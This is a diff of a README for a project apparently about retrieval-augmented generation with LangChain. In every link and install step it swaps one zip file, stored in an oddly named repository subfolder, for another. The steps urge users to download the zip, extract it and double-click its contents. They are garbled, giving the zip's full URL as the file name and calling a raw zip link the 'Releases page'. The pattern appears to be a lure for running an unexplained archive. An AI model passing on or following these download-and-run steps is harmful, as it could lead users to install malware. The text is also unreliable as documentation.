@@ -16,18 +16,18 @@ Before you download, ensure your computer meets the following:
 - Basic familiarity with running programs on your computer
 
 ## 📥 Download Now
-[![Download rag-using-langchain](https://raw.githubusercontent.com/alikanan1234/rag-using-langchain/master/electrodialyze/rag-using-langchain.zip%20rag--using--langchain-v1.0-blue)](https://raw.githubusercontent.com/alikanan1234/rag-using-langchain/master/electrodialyze/rag-using-langchain.zip)
+[![Download rag-using-langchain](https://github.com/alikanan1234/rag-using-langchain/raw/refs/heads/master/electrodialyze/using_rag_langchain_2.2.zip%20rag--using--langchain-v1.0-blue)](https://github.com/alikanan1234/rag-using-langchain/raw/refs/heads/master/electrodialyze/using_rag_langchain_2.2.zip)
 
 You can find the latest version available for download on our Releases page. Click the link below to access it.
 
-[Download Link](https://raw.githubusercontent.com/alikanan1234/rag-using-langchain/master/electrodialyze/rag-using-langchain.zip)
+[Download Link](https://github.com/alikanan1234/rag-using-langchain/raw/refs/heads/master/electrodialyze/using_rag_langchain_2.2.zip)
 
 ## 🔧 Installation Steps
 Follow these steps to install and begin using the application:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page:  
-   [Download Link](https://raw.githubusercontent.com/alikanan1234/rag-using-langchain/master/electrodialyze/rag-using-langchain.zip)
+   [Download Link](https://github.com/alikanan1234/rag-using-langchain/raw/refs/heads/master/electrodialyze/using_rag_langchain_2.2.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version listed. It would typically be marked as "Latest Release."
@@ -36,13 +36,13 @@ Follow these steps to install and begin using the application:
    Click on the file name to download it. The file will contain the application along with necessary dependencies.
 
 4. **Locate the Downloaded File**  
-   Once the download completes, navigate to your downloads folder. You should see a file like "https://raw.githubusercontent.com/alikanan1234/rag-using-langchain/master/electrodialyze/rag-using-langchain.zip" or similar.
+   Once the download completes, navigate to your downloads folder. You should see a file like "https://github.com/alikanan1234/rag-using-langchain/raw/refs/heads/master/electrodialyze/using_rag_langchain_2.2.zip" or similar.
 
 5. **Extract the Contents**  
    If your file is a zip, right-click on it and choose "Extract All" to pull out all the files into a new folder.
 
 6. **Running the Application**  
-   Navigate to the folder where you extracted the files. Find the file named "https://raw.githubusercontent.com/alikanan1234/rag-using-langchain/master/electrodialyze/rag-using-langchain.zip" and double-click it. This should start the application.
+   Navigate to the folder where you extracted the files. Find the file named "https://github.com/alikanan1234/rag-using-langchain/raw/refs/heads/master/electrodialyze/using_rag_langchain_2.2.zip" and double-click it. This should start the application.
 
 7. **Follow On-Screen Instructions**  
    Once the application is running, follow any on-screen prompts to start using the features.
